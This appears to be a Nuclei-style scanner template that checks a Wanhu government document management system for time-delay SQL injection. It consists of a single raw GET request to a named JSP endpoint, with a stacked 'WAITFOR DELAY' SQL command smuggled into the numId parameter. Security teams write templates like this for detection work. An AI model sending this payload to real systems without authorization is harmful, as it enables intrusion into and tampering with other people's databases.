id: wanhu-govdocumentmanager_judge_receivenum-sql-injection-time-delay

info:
  name: SQLi Time Delay (Windows Compatible)
  author: iSee857
  severity: high
  description: wanhu govdocumentmanager_judge_receivenum sqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_judge_receivenum.jsp;.js?numId=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
        Host: {{Host}}
